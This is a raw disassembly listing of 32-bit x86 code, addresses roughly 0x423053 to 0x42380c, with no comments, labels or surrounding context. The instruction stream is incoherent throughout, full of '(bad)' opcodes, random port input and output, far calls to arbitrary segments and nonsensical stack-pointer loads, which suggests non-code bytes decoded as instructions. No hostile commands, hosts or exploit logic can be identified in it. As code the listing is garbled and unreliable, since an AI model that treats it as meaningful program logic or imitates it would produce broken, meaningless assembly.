  423053:	add    al,0xb8
  423055:	push   edx
  423056:	lds    ebp,FWORD PTR [ebp+0x1cb988e5]
  42305c:	int3   
  42305d:	mov    edx,0x4e4ab5bd
  423062:	push   eax
  423063:	jo     0x42309c
  423065:	mov    WORD PTR [ebp+0x4b],?
  423068:	dec    edx
  423069:	pop    ecx
  42306a:	mov    esp,0xa920f6c2
  42306f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423070:	pop    esi
  423071:	(bad)  
  423072:	retf   0x7d91
  423075:	(bad)  
  423076:	stc    
  423077:	std    
  423078:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423079:	sub    ecx,DWORD PTR [edx]
  42307b:	push   ecx
  42307c:	mov    bh,0xdb
  42307e:	adc    DWORD PTR [eax-0x4cde9285],edi
  423084:	inc    ebp
  423085:	pop    edx
  423086:	cdq    
  423087:	pop    ds
  423088:	into   
  423089:	xor    al,0x6e
  42308b:	scas   al,BYTE PTR es:[edi]
  42308c:	xchg   ebp,edi
  42308e:	xchg   edi,eax
  42308f:	adc    edx,DWORD PTR [edx+0x47]
  423092:	or     BYTE PTR [ebp-0x56d7eaed],bl
  423098:	in     eax,0x6d
  42309a:	repz mov ds:0x33f3a2f0,eax
  4230a0:	popa   
  4230a1:	xor    dh,BYTE PTR [ebp+0x392d5a98]
  4230a7:	popa   
  4230a8:	neg    BYTE PTR [edi]
  4230aa:	dec    ebp
  4230ab:	jg     0x4230fb
  4230ad:	outs   dx,BYTE PTR ds:[esi]
  4230ae:	mov    ds:0x97662277,eax
  4230b3:	aaa    
  4230b4:	ds mov esi,0x5b43db19
  4230ba:	repnz push edx
  4230bc:	stc    
  4230bd:	cmp    BYTE PTR [ebx],cl
  4230bf:	sbb    BYTE PTR [ecx+0x66],bh
  4230c2:	mov    BYTE PTR [ebp-0x1c],bl
  4230c5:	mov    ds:0xad509670,al
  4230ca:	mov    BYTE PTR [edi],dl
  4230cc:	in     eax,dx
  4230cd:	into   
  4230ce:	lods   eax,DWORD PTR ds:[esi]
  4230cf:	add    al,BYTE PTR [ebx-0x68]
  4230d2:	mov    esp,0x4f18ea69
  4230d7:	mov    ah,0x8f
  4230d9:	out    dx,al
  4230da:	push   eax
  4230db:	dec    ebx
  4230dc:	mov    esp,0x32b54718
  4230e1:	out    0x15,al
  4230e3:	add    esp,DWORD PTR [eax]
  4230e5:	ds daa 
  4230e7:	ret    0xdc38
  4230ea:	(bad)  
  4230eb:	in     eax,0xf8
  4230ed:	in     eax,dx
  4230ee:	repnz lahf 
  4230f0:	retf   0xd96b
  4230f3:	sbb    edx,DWORD PTR [esi]
  4230f5:	mov    ds:0x555af406,eax
  4230fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230fb:	sbb    eax,0x21caf974
  423100:	add    bl,al
  423102:	aas    
  423103:	pop    ebp
  423104:	mov    cl,0xf3
  423106:	push   ebp
  423107:	lds    esi,FWORD PTR [eax]
  423109:	out    0xc9,al
  42310b:	push   esi
  42310c:	(bad)  
  42310e:	pop    edi
  42310f:	adc    eax,0x14686d6e
  423114:	jno    0x42309f
  423116:	mov    ss,WORD PTR [esi-0x6e]
  423119:	fidiv  DWORD PTR [esi-0x7bb9b709]
  42311f:	pop    ebp
  423120:	sbb    eax,0xa54a13a
  423125:	stc    
  423126:	call   DWORD PTR [ecx]
  423128:	jge    0x423126
  42312a:	xor    ecx,DWORD PTR [edi+ecx*4]
  42312d:	jo     0x4230c5
  42312f:	pop    edx
  423130:	mov    ah,0x33
  423132:	pop    ecx
  423133:	or     esi,ebp
  423135:	aas    
  423136:	pop    ss
  423137:	xor    al,0xdf
  423139:	and    eax,0x504b9830
  42313e:	int3   
  42313f:	rcl    DWORD PTR [edx],0x3a
  423142:	mov    ecx,0xc2bf5240
  423147:	jnp    0x42314c
  423149:	xchg   esi,eax
  42314a:	and    eax,0xc3941984
  42314f:	dec    esp
  423150:	add    ebx,DWORD PTR [ecx]
  423152:	int    0xe3
  423154:	mov    eax,ds:0x9835f7e0
  423159:	xchg   edx,eax
  42315a:	pop    ebp
  42315b:	test   DWORD PTR [ecx+0x7d],ebp
  42315e:	and    al,0xfc
  423160:	dec    eax
  423161:	(bad)  
  423162:	push   ss
  423163:	jo     0x42315b
  423165:	mov    al,ds:0xa11b81b3
  42316a:	(bad)  
  42316b:	retf   
  42316c:	call   0xb8e8:0xfad288a9
  423173:	in     eax,0x94
  423175:	inc    ecx
  423176:	stos   BYTE PTR es:[edi],al
  423177:	jno    0x42312a
  423179:	pushf  
  42317a:	inc    edi
  42317b:	sbb    DWORD PTR [esi-0x4c],edx
  42317e:	pushf  
  42317f:	jecxz  0x423143
  423181:	fcomp  DWORD PTR [eax-0x45efeab3]
  423187:	in     eax,0xd8
  423189:	xor    BYTE PTR [edx+0x5e],bh
  42318c:	push   edx
  42318d:	xchg   edi,eax
  42318e:	dec    edx
  42318f:	xchg   BYTE PTR [ebp+0x41],dl
  423192:	mov    eax,DWORD PTR [esi]
  423194:	pusha  
  423195:	xor    edi,DWORD PTR [esi+0x3b]
  423198:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423199:	push   edx
  42319a:	repnz in al,0xa9
  42319d:	jge    0x423219
  42319f:	scas   eax,DWORD PTR es:[edi]
  4231a0:	inc    BYTE PTR [edi+0x8]
  4231a3:	int    0xdf
  4231a5:	dec    ebx
  4231a6:	xchg   esi,eax
  4231a7:	imul   ebx,DWORD PTR [ebx+0x7a8170c4],0xd74a027a
  4231b1:	pusha  
  4231b2:	sbb    BYTE PTR [ebp-0x12d487a0],dh
  4231b8:	outs   dx,DWORD PTR ds:[esi]
  4231b9:	dec    esi
  4231ba:	mov    ch,0xe3
  4231bc:	sub    al,0x63
  4231be:	push   eax
  4231bf:	jp     0x423170
  4231c1:	and    al,0x22
  4231c3:	xchg   edx,eax
  4231c4:	add    edi,DWORD PTR [edx]
  4231c6:	(bad)  
  4231c7:	jle    0x423200
  4231c9:	pop    ds
  4231ca:	div    DWORD PTR [esi]
  4231cc:	stos   DWORD PTR es:[edi],eax
  4231cd:	cmp    DWORD PTR [edx+0x5f],ecx
  4231d0:	mov    esp,0x91c3e7b7
  4231d5:	dec    edx
  4231d6:	icebp  
  4231d7:	shr    ebp,0x61
  4231da:	cmp    edx,DWORD PTR [edi-0x54af1916]
  4231e0:	mov    gs,WORD PTR ds:0x2a1fe836
  4231e6:	cmp    ebx,esi
  4231e8:	shl    BYTE PTR [ecx-0x62],cl
  4231eb:	and    al,BYTE PTR [ecx]
  4231ed:	mov    al,0xf8
  4231ef:	mov    WORD PTR ds:0x6a5d2f0d,ss
  4231f5:	pop    esp
  4231f6:	lods   eax,DWORD PTR ds:[esi]
  4231f7:	out    0xd2,eax
  4231f9:	mov    ah,BYTE PTR [esi+0x2174f0]
  4231ff:	jno    0x4231cb
  423201:	(bad)  
  423202:	imul   ecx,edi,0xff3850bc
  423208:	mov    cl,0x8b
  42320a:	pop    edi
  42320b:	std    
  42320c:	inc    esi
  42320d:	pop    esi
  42320e:	jge    0x42319a
  423210:	mov    esp,0xc01cfbc9
  423215:	and    ecx,DWORD PTR [esi-0x3b]
  423218:	jne    0x423258
  42321a:	mov    ch,cl
  42321c:	clc    
  42321d:	or     edi,DWORD PTR [eax-0x7b97f352]
  423223:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423224:	mov    ebx,0x75b09ccd
  423229:	mov    ds:0x34fcbb72,eax
  42322e:	ja     0x423272
  423230:	and    al,0x8d
  423232:	sbb    BYTE PTR [edi],ch
  423234:	retf   
  423235:	sbb    ebx,DWORD PTR [ecx+0x67]
  423238:	mov    bh,0xa7
  42323a:	les    edi,FWORD PTR [ebx+ebp*4]
  42323d:	push   ds
  42323e:	rol    eax,0x33
  423241:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423242:	lods   eax,DWORD PTR ds:[esi]
  423243:	mov    dh,0xa4
  423245:	or     al,0x7c
  423247:	ret    0x20bc
  42324a:	mov    dh,0xa8
  42324c:	mov    ebx,?
  42324e:	lds    eax,FWORD PTR [ecx+edi*2-0x50]
  423252:	out    0xab,al
  423254:	add    BYTE PTR [esi+0x36d8afaa],al
  42325a:	push   cs
  42325b:	lods   eax,DWORD PTR ds:[esi]
  42325c:	int3   
  42325d:	aad    0x6a
  42325f:	je     0x42326b
  423261:	xor    bl,ch
  423263:	in     al,dx
  423264:	jbe    0x42324b
  423266:	outs   dx,DWORD PTR ds:[esi]
  423267:	mov    dh,0xfc
  423269:	call   0x84c:0xeba3aae2
  423270:	mov    ds:0xc45585ec,eax
  423275:	add    bl,BYTE PTR [edi+ebp*2+0x5]
  423279:	scas   al,BYTE PTR es:[edi]
  42327a:	stos   DWORD PTR es:[edi],eax
  42327b:	xchg   ebp,eax
  42327c:	xchg   ecx,eax
  42327d:	adc    eax,0xfc0680ef
  423282:	mov    ebx,DWORD PTR [edx-0x7a790480]
  423288:	or     esi,DWORD PTR [eax]
  42328a:	and    eax,0x7ccea359
  42328f:	cmp    DWORD PTR [edx],esi
  423291:	dec    ecx
  423292:	inc    ecx
  423293:	mov    ebx,0x621f2b06
  423298:	mov    esp,0xff4e2e34
  42329d:	enter  0x3924,0xf7
  4232a1:	fsubr  DWORD PTR ds:[esi]
  4232a4:	repnz xor BYTE PTR [ebx],0x32
  4232a8:	push   esp
  4232a9:	popf   
  4232aa:	fs std 
  4232ac:	jmp    0x4232d8
  4232ae:	retf   
  4232af:	sbb    DWORD PTR [ebp-0x77],eax
  4232b2:	fcomp  DWORD PTR [eax-0x4b]
  4232b5:	mov    al,ds:0xd79a31c4
  4232ba:	int    0xb9
  4232bc:	and    ebx,DWORD PTR [ecx+eax*8-0x66]
  4232c0:	test   edi,esp
  4232c2:	and    edx,DWORD PTR [esi-0x5459d471]
  4232c8:	arpl   WORD PTR [ebx+ebx*2],di
  4232cb:	cmp    ah,BYTE PTR [esi]
  4232cd:	and    bh,BYTE PTR [esi+0x70]
  4232d0:	or     al,0x3c
  4232d2:	ds and al,BYTE PTR es:[edi+0x31]
  4232d7:	scas   al,BYTE PTR es:[edi]
  4232d8:	imul   ebp,ebp,0x18
  4232db:	jge    0x4232c4
  4232dd:	inc    esp
  4232de:	ss pop edx
  4232e0:	sti    
  4232e1:	push   ss
  4232e2:	inc    ebp
  4232e3:	rcl    BYTE PTR [ebp-0x6b26adbb],0x54
  4232ea:	jge    0x4232cd
  4232ec:	les    esp,FWORD PTR [esi]
  4232ee:	lods   al,BYTE PTR ds:[esi]
  4232ef:	pop    edi
  4232f0:	idiv   edi
  4232f2:	div    BYTE PTR [esp+esi*2-0x1ff2a585]
  4232f9:	sub    ecx,DWORD PTR [esi-0x4b]
  4232fc:	into   
  4232fd:	stos   DWORD PTR es:[edi],eax
  4232fe:	cli    
  4232ff:	cli    
  423300:	cmp    bh,BYTE PTR [esi+ecx*1]
  423303:	dec    eax
  423304:	dec    ebx
  423305:	pop    ecx
  423306:	add    eax,0x8ffbcbde
  42330b:	cmp    ecx,ebp
  42330d:	pusha  
  42330e:	loopne 0x4232d7
  423310:	or     eax,0x4a3fb9ec
  423315:	lock jg 0x4232ab
  423318:	or     al,0x58
  42331a:	sti    
  42331b:	inc    ebp
  42331c:	fild   QWORD PTR [ebx+0xa78d5e5]
  423322:	mov    esi,0xdeb0959e
  423327:	lods   eax,DWORD PTR ds:[esi]
  423328:	aas    
  423329:	cmp    edx,DWORD PTR [eax-0x53a8306f]
  42332f:	adc    DWORD PTR [ebx+0x44],edx
  423332:	out    0x23,al
  423334:	sbb    al,BYTE PTR fs:0xcac2023b
  42333b:	arpl   ax,di
  42333d:	aad    0x14
  42333f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423340:	mov    al,0xd1
  423342:	jo     0x4233af
  423344:	cs pop es
  423346:	neg    BYTE PTR [ebx-0x2b48a9b]
  42334c:	cmp    ecx,DWORD PTR [ebp-0x22a1fe4b]
  423352:	imul   esi,edx,0x5dd8a55e
  423358:	call   0x89211255
  42335d:	sub    eax,0xac0db6d6
  423362:	inc    esi
  423363:	or     esp,ecx
  423365:	aas    
  423366:	mov    edx,0xddeb9efd
  42336b:	hlt    
  42336c:	xor    eax,0x6cc0050
  423371:	jmp    0x99d6:0xecbf6ed6
  423378:	dec    esp
  423379:	rcr    DWORD PTR [esi],cl
  42337b:	in     eax,0xf4
  42337d:	push   eax
  42337e:	int3   
  42337f:	inc    ebp
  423380:	or     ebp,DWORD PTR [edx]
  423382:	push   esi
  423383:	inc    esi
  423384:	test   al,0x2
  423386:	xchg   BYTE PTR [edx-0x3a],bh
  423389:	mov    ds:0x980fe4c9,al
  42338e:	ss ins BYTE PTR es:[edi],dx
  423390:	jns    0x42338d
  423392:	xor    eax,0x69186b95
  423397:	ds aad 0x5
  42339a:	mov    cl,0x87
  42339c:	and    dh,BYTE PTR [edi+0x1d]
  42339f:	sbb    bh,dh
  4233a1:	or     dl,BYTE PTR [ecx]
  4233a3:	arpl   sp,bp
  4233a5:	and    al,0xe8
  4233a7:	inc    edi
  4233a8:	xor    eax,0xcc12f45e
  4233ad:	or     al,0x43
  4233af:	fistp  DWORD PTR [edx+0x3ef2bd43]
  4233b5:	rol    esp,1
  4233b7:	out    0x52,eax
  4233b9:	xchg   edi,eax
  4233ba:	pop    ecx
  4233bb:	cmp    al,ch
  4233bd:	mov    esi,0xb0f47757
  4233c2:	mov    al,ds:0x28af9469
  4233c7:	mov    al,0xc9
  4233c9:	jne    0x4233cc
  4233cb:	inc    eax
  4233cc:	pop    ebx
  4233cd:	mov    ebp,ebp
  4233cf:	dec    ebx
  4233d0:	push   cs
  4233d1:	cs jo  0x42341d
  4233d4:	jne    0x423425
  4233d6:	aam    0xe5
  4233d8:	jp     0x42342f
  4233da:	sub    edi,DWORD PTR [ebx-0x37]
  4233dd:	cmp    BYTE PTR [eax-0xc42e3ca],bl
  4233e3:	sbb    eax,0x11600fd7
  4233e8:	jae    0x423386
  4233ea:	sub    bl,BYTE PTR [esi-0x44]
  4233ed:	adc    bh,ch
  4233ef:	loope  0x4233b4
  4233f1:	dec    ebp
  4233f2:	dec    edi
  4233f3:	ss std 
  4233f5:	stos   BYTE PTR es:[edi],al
  4233f6:	scas   eax,DWORD PTR es:[edi]
  4233f7:	fimul  WORD PTR [esp+edx*4]
  4233fa:	in     eax,0xde
  4233fc:	and    ecx,DWORD PTR [edx]
  4233fe:	out    0xa5,eax
  423400:	push   eax
  423401:	ins    BYTE PTR es:[edi],dx
  423402:	sbb    DWORD PTR [esi-0x50],esi
  423405:	popa   
  423406:	aad    0xa
  423408:	cmp    eax,0x55d8ed97
  42340d:	mov    cl,0xb5
  42340f:	test   al,0x49
  423411:	stos   DWORD PTR es:[edi],eax
  423412:	mov    al,ds:0xe72705b5
  423417:	mov    ecx,0xe7ef765c
  42341c:	pushf  
  42341d:	iret   
  42341e:	lods   al,BYTE PTR ds:[esi]
  42341f:	cmp    esp,DWORD PTR cs:[ecx]
  423422:	ret    0x8327
  423425:	dec    edx
  423426:	mov    ebp,0x2d157031
  42342b:	leave  
  42342c:	sbb    al,0x5f
  42342e:	ror    DWORD PTR [esi-0x35b2b6cf],1
  423434:	ja     0x423453
  423436:	fcmovnu st,st(5)
  423438:	mov    ch,0x3b
  42343a:	aas    
  42343b:	or     BYTE PTR [ebp+0x47a411ff],dl
  423441:	adc    eax,0x99aee338
  423446:	arpl   WORD PTR [esi],bx
  423448:	xchg   ebp,eax
  423449:	add    dh,BYTE PTR [ecx+edx*2]
  42344c:	lahf   
  42344d:	outs   dx,BYTE PTR ds:[esi]
  42344e:	xor    al,0xa
  423450:	dec    ebx
  423451:	adc    ch,BYTE PTR [eax]
  423453:	icebp  
  423454:	aam    0xd7
  423456:	loop   0x423451
  423458:	addr16 sub al,0x3a
  42345b:	sbb    DWORD PTR [ecx+0x5d],edi
  42345e:	xlat   BYTE PTR ds:[ebx]
  42345f:	outs   dx,BYTE PTR ds:[esi]
  423460:	xchg   ebp,eax
  423461:	lea    ebx,[ebx-0x5d]
  423464:	ins    BYTE PTR es:[edi],dx
  423465:	das    
  423466:	in     al,dx
  423467:	dec    edi
  423468:	dec    ebx
  423469:	push   ds
  42346a:	(bad)  
  42346b:	fstp   QWORD PTR [edi+0x5570de30]
  423471:	lods   eax,DWORD PTR ds:[esi]
  423472:	dec    ecx
  423473:	cdq    
  423474:	aad    0x27
  423476:	push   ebx
  423477:	push   edi
  423478:	icebp  
  423479:	adc    dl,bl
  42347b:	(bad)  
  42347d:	fidivr DWORD PTR [esi-0x3b]
  423480:	or     DWORD PTR [edx-0x3a41be71],0x8f4d3ac6
  42348a:	cli    
  42348b:	ret    
  42348c:	cmp    dl,BYTE PTR [edx-0x51da630]
  423492:	lods   al,BYTE PTR ds:[esi]
  423493:	lock inc ecx
  423495:	sub    ch,bh
  423497:	pop    edx
  423499:	mov    bh,0xcc
  42349b:	lds    ebp,FWORD PTR [edi+0x1f1cfdd2]
  4234a1:	inc    edi
  4234a2:	sub    al,0x6e
  4234a4:	or     ch,0xa4
  4234a7:	int3   
  4234a8:	cld    
  4234a9:	and    BYTE PTR [ebx],0x1
  4234ac:	pop    es
  4234ad:	push   esi
  4234ae:	sub    al,0xdf
  4234b0:	cmc    
  4234b1:	push   ds
  4234b2:	lods   al,BYTE PTR ds:[esi]
  4234b3:	add    eax,0x6a5aee7
  4234b8:	sub    DWORD PTR [ecx],ecx
  4234ba:	shr    bh,1
  4234bc:	xor    eax,0xd7804069
  4234c1:	loop   0x42346a
  4234c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4234c4:	mov    edi,0x71fc63b1
  4234c9:	push   0xe
  4234cb:	or     al,0x72
  4234cd:	(bad)  [ebx+0x36b8d117]
  4234d3:	dec    esi
  4234d4:	(bad)  
  4234d5:	ss (bad) 
  4234d9:	sbb    edi,DWORD PTR [ebx+0x281f75b2]
  4234df:	adc    BYTE PTR [edi+0x788f991e],0xcf
  4234e6:	add    eax,0x6e9f855d
  4234eb:	or     eax,0xbb69e0ad
  4234f0:	push   0xa32c1c5c
  4234f5:	lods   eax,DWORD PTR ds:[esi]
  4234f6:	iret   
  4234f7:	mov    ch,0x49
  4234f9:	nop    DWORD PTR [edx+0x3925855e]
  423500:	iret   
  423501:	int    0x89
  423503:	mov    cl,0xcc
  423505:	outs   dx,BYTE PTR ds:[esi]
  423506:	xor    cl,ah
  423508:	push   eax
  423509:	shl    ecx,1
  42350b:	pop    ds
  42350c:	dec    eax
  42350d:	rcr    eax,0x8b
  423510:	xchg   esi,eax
  423511:	fist   DWORD PTR [esi]
  423513:	ss xchg ecx,eax
  423515:	ret    
  423516:	mov    edx,0xf59263e8
  42351b:	aad    0x53
  42351d:	push   edx
  42351e:	lds    ebp,FWORD PTR [edi+0x4484be19]
  423524:	adc    al,0x78
  423526:	jns    0x4234e1
  423528:	ret    0x530c
  42352b:	out    dx,eax
  42352c:	(bad)  
  42352d:	mov    dl,0xad
  42352f:	(bad)  
  423530:	aas    
  423531:	pop    edx
  423532:	sub    bh,cl
  423534:	xor    bl,bh
  423536:	out    dx,eax
  423537:	mov    esi,edi
  423539:	shl    al,0xa
  42353c:	cwde   
  42353d:	mov    dl,0xe8
  42353f:	mov    ds:0x505d271b,al
  423544:	enter  0xe892,0x12
  423548:	add    cl,ah
  42354a:	sbb    al,BYTE PTR [eax]
  42354c:	outs   dx,BYTE PTR ds:[esi]
  42354d:	inc    edx
  42354e:	jne    0x4234ef
  423550:	rcl    DWORD PTR [ebx-0x3d],0xd9
  423554:	mov    bl,0x32
  423556:	jl     0x4235cf
  423558:	jne    0x42352b
  42355a:	repnz push edi
  42355c:	in     eax,dx
  42355d:	inc    edx
  42355e:	push   eax
  42355f:	bound  ecx,QWORD PTR [ecx-0x43affc4f]
  423565:	repnz sub BYTE PTR [esi-0x27d889c6],cl
  42356c:	and    ebx,eax
  42356e:	sbb    al,0x8b
  423570:	push   ebp
  423571:	ror    BYTE PTR [ebx+0x1984eaee],cl
  423577:	cmp    al,0x2b
  423579:	nop
  42357a:	cdq    
  42357b:	or     DWORD PTR [edi-0x6],0xffffff8c
  42357f:	fwait
  423580:	into   
  423581:	popa   
  423582:	push   ebx
  423583:	and    al,0x53
  423585:	mov    ebx,0xc462ae8e
  42358a:	nop
  42358b:	lods   eax,DWORD PTR ds:[esi]
  42358c:	pop    ebp
  42358d:	clc    
  42358e:	(bad)  
  42358f:	adc    cl,BYTE PTR [edi+esi*2-0x6c]
  423593:	mov    bl,al
  423595:	popf   
  423596:	mov    edx,0xb51fccc6
  42359b:	std    
  42359c:	test   DWORD PTR [esi+0x20bd75c6],0xd0607ba0
  4235a6:	sbb    ch,ah
  4235a8:	enter  0x5ed6,0xac
  4235ac:	add    BYTE PTR [ebx-0x34e797e4],dl
  4235b2:	gs test DWORD PTR es:[eax*4-0x72d3e556],esi
  4235bb:	(bad)  
  4235bc:	aad    0xdb
  4235be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4235bf:	jbe    0x4235c3
  4235c1:	and    eax,DWORD PTR [ebx+0x412cba20]
  4235c7:	stc    
  4235c8:	std    
  4235c9:	lahf   
  4235ca:	sbb    ebx,esi
  4235cc:	ds jne 0x4235e9
  4235cf:	push   cs
  4235d0:	jns    0x42364f
  4235d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235d3:	mov    ebx,0xd65b7d3a
  4235d8:	pop    esi
  4235d9:	cmp    eax,DWORD PTR [ebp-0x40f1f6d8]
  4235df:	out    0xdf,al
  4235e1:	mov    eax,ds:0x31028946
  4235e6:	inc    esp
  4235e7:	cwde   
  4235e8:	pop    edi
  4235e9:	cld    
  4235ea:	pop    es
  4235eb:	(bad)  
  4235ec:	push   esi
  4235ed:	cdq    
  4235ee:	add    ch,dl
  4235f0:	aaa    
  4235f1:	mov    eax,0x13bca43f
  4235f6:	adc    eax,0xe2ad5752
  4235fb:	or     DWORD PTR [ecx-0x73f975d9],ebx
  423601:	call   0xb73c0478
  423606:	in     eax,dx
  423607:	dec    edx
  423608:	test   al,0xa1
  42360a:	mov    ebp,DWORD PTR [ebx+0x19]
  42360d:	sbb    eax,0xd195bfa4
  423612:	loope  0x423632
  423614:	stos   DWORD PTR es:[edi],eax
  423615:	xor    BYTE PTR [si],bh
  423618:	(bad)  
  42361a:	adc    ah,BYTE PTR [ebp+0x45]
  42361d:	repz in al,dx
  42361f:	fwait
  423620:	call   0xa37871ec
  423625:	je     0x4235c8
  423627:	loope  0x4235c9
  423629:	lahf   
  42362a:	mov    edi,0xaec3d6be
  42362f:	fcomp  QWORD PTR [esp+eiz*2]
  423632:	cmp    eax,0x5b39c119
  423637:	fbld   TBYTE PTR [edx+0x5b155eee]
  42363d:	clc    
  42363e:	dec    ecx
  42363f:	int3   
  423640:	in     eax,0x3c
  423642:	mov    al,ds:0x61a93714
  423647:	je     0x4235fd
  423649:	dec    edi
  42364a:	mov    eax,0x6e2acae3
  42364f:	imul   esp,DWORD PTR [esi+esi*2],0xffffff90
  423653:	pop    eax
  423654:	out    dx,al
  423655:	add    esp,ebx
  423657:	and    al,0x7b
  423659:	lea    ebp,[edx]
  42365b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42365c:	jne    0x4236ad
  42365e:	nop
  42365f:	adc    edi,ebx
  423661:	or     ebx,DWORD PTR [eax]
  423663:	push   ebx
  423664:	fisttp DWORD PTR [edx+edx*2+0x54]
  423668:	test   eax,0x5ad641a9
  42366d:	mov    dl,0xd2
  42366f:	in     eax,0x4e
  423671:	shr    BYTE PTR [esi+ebp*2+0x368cd4cc],cl
  423678:	mov    ebp,0x367ec950
  42367d:	jecxz  0x42367f
	...
  423687:	add    BYTE PTR [eax],al
  423689:	add    BYTE PTR [eax+0x59],bl
  42368c:	dec    ebx
  42368d:	push   ebp
  42368e:	dec    ebx
  42368f:	push   edi
  423690:	pop    esi
  423691:	pop    ebp
  423692:	mov    ebx,0xaea42923
  423697:	xor    BYTE PTR [ecx+0x0],0xa4
  42369b:	les    eax,FWORD PTR [ecx]
  42369d:	add    BYTE PTR [esi+eax*1+0x0],bh
  4236a1:	add    BYTE PTR [edi+0x74],dl
  4236a4:	push   ds
  4236a5:	lock mov ds:0x26474489,eax
  4236ab:	xlat   BYTE PTR ds:[ebx]
  4236ac:	adc    bl,cl
  4236ae:	ror    BYTE PTR [esi],0x46
  4236b1:	cs clc 
  4236b3:	push   ds
  4236b4:	cli    
  4236b5:	xchg   ebp,esp
  4236b7:	arpl   WORD PTR [eax],bx
  4236b9:	jae    0x42372d
  4236bb:	and    eax,0x212a3354
  4236c0:	addr16 dec ebx
  4236c2:	jns    0x423737
  4236c4:	fnstsw WORD PTR [ebx+0xa]
  4236c7:	data16 ds add bh,cl
  4236cb:	and    DWORD PTR [ebx+esi*8+0x2961b570],eax
  4236d2:	xchg   DWORD PTR [ebp-0x6e],ebx
  4236d5:	in     al,0xaf
  4236d7:	inc    ebp
  4236d8:	jno    0x4236b8
  4236da:	nop
  4236db:	adc    al,BYTE PTR [edx]
  4236dd:	fnstenv [ecx+0x63]
  4236e0:	xchg   esp,eax
  4236e1:	and    al,0xd0
  4236e3:	clc    
  4236e4:	sbb    esp,DWORD PTR [ebx]
  4236e6:	in     al,0x83
  4236e8:	lods   eax,DWORD PTR ds:[si]
  4236ea:	mov    dh,0x1e
  4236ec:	fild   WORD PTR [ebp+0x72f22490]
  4236f2:	mov    WORD PTR [eax+eiz*8],es
  4236f5:	loop   0x42368a
  4236f7:	xchg   ebp,eax
  4236f8:	dec    esi
  4236f9:	aas    
  4236fa:	xchg   DWORD PTR [esi+esi*2],edi
  4236fd:	pop    eax
  4236fe:	inc    ebx
  4236ff:	cld    
  423700:	nop
  423701:	or     BYTE PTR [ebp+0x69f180b6],ch
  423707:	xchg   ecx,eax
  423708:	push   ebp
  423709:	mov    dh,0x2
  42370b:	ret    0x62d6
  42370e:	lea    ecx,[edi]
  423710:	dec    esi
  423711:	dec    ebp
  423712:	jns    0x4236fd
  423714:	mov    ebp,0xf0f518c6
  423719:	pop    edx
  42371a:	add    dh,BYTE PTR [ebx+edx*8-0x22576d]
  423721:	cmp    eax,0xbb6b7936
  423726:	inc    esp
  423727:	leave  
  423728:	(bad)  
  42372a:	sub    esi,edx
  42372c:	add    al,0x9f
  42372e:	and    DWORD PTR [esi+edx*8-0x62],edi
  423732:	push   ecx
  423733:	adc    DWORD PTR [edx],ebx
  423735:	push   es
  423736:	add    eax,0xefaaf5
  42373b:	jbe    0x4236e1
  42373d:	fstp   st(5)
  42373f:	pushf  
  423740:	xor    DWORD PTR [ebp+0x23],esi
  423743:	pop    eax
  423744:	jo     0x423750
  423746:	or     al,0xf0
  423748:	pop    ds
  423749:	gs mov ch,0x7f
  42374c:	or     DWORD PTR [esi+0x396f9029],edi
  423752:	xor    esi,DWORD PTR [edi+0x4b]
  423755:	loope  0x42372d
  423757:	scas   eax,DWORD PTR es:[edi]
  423758:	fcmovnb st,st(1)
  42375a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42375b:	aam    0x66
  42375d:	inc    ebp
  42375e:	push   edi
  42375f:	ja     0x4237a7
  423761:	pusha  
  423762:	xlat   BYTE PTR ds:[ebx]
  423763:	in     eax,0x96
  423765:	mov    ds:0xccf88f7f,al
  42376a:	mov    al,0xbe
  42376c:	pop    ebx
  42376d:	lds    ecx,FWORD PTR [edi-0x5eac2209]
  423773:	mov    ds:0x69f11d7,al
  423778:	test   BYTE PTR [eax+edx*1],0x45
  42377c:	xor    al,0xdc
  42377e:	jl     0x42376a
  423780:	push   esp
  423781:	cmp    eax,0x763bbd5e
  423786:	xor    eax,0x49e98ccc
  42378b:	dec    esp
  42378c:	xor    BYTE PTR fs:[ebp-0x3a9b758d],al
  423793:	ja     0x423775
  423795:	sahf   
  423796:	call   0xe819c42
  42379b:	dec    ebp
  42379c:	cli    
  42379d:	aas    
  42379e:	pop    esi
  42379f:	or     BYTE PTR ds:0xca498e45,dh
  4237a5:	test   DWORD PTR [edx],esi
  4237a7:	lahf   
  4237a8:	jle    0x4237db
  4237aa:	arpl   bp,ax
  4237ac:	add    edi,ebx
  4237ae:	int    0x68
  4237b0:	aam    0x9b
  4237b2:	push   edi
  4237b3:	(bad)  
  4237b4:	xchg   ebp,eax
  4237b5:	fs mov edx,0x69aa79d4
  4237bb:	call   0x8a4f8b63
  4237c0:	outs   dx,BYTE PTR ds:[esi]
  4237c1:	adc    BYTE PTR [ebx],cl
  4237c3:	adc    eax,0xb414c50d
  4237c8:	outs   dx,BYTE PTR ds:[esi]
  4237ca:	repz retf 
  4237cc:	fiadd  WORD PTR [edi-0x570b7f62]
  4237d2:	jg     0x42381d
  4237d4:	inc    ecx
  4237d5:	add    DWORD PTR [esi+0x5c],ebx
  4237d8:	cmp    BYTE PTR [esi+0x5d],al
  4237db:	out    dx,al
  4237dc:	or     eax,0xd875bb23
  4237e1:	push   ds
  4237e2:	adc    dl,BYTE PTR [esi-0x2e82d747]
  4237e8:	popf   
  4237e9:	dec    ebx
  4237ea:	(bad)
  4237ee:	retf   
  4237ef:	or     DWORD PTR [ecx-0x226a1e61],esi
  4237f5:	fadd   DWORD PTR [esi+0x2e]
  4237f8:	clc    
  4237f9:	xor    esi,DWORD PTR [eax+ecx*4]
  4237fc:	mov    bh,0x5b
  4237fe:	ror    ah,cl
  423800:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423801:	cmp    al,0x88
  423803:	sar    DWORD PTR [ebp+0x3503b3e],cl
  423809:	or     al,BYTE PTR [si]
  42380c:	icebp  
